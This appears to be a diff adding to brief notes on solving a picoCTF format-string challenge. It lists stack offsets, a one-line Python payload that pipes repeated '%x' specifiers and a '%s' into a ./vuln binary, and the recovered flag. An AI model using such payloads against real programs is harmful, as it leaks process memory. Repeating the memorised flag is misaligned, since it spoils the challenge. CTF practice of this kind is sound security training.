@@ -42,3 +42,12 @@ format strings
 %85$s == ./vuln
 
 %100$s == SHELL=/bin/bash
+
+screw around with offsets until hit the right one
+
+----------------------------------------
+
+python -c 'print "%x"*36 + "%s"' | ./vuln
+
+picoCTF{str1nG_CH3353_b7f47023}
+
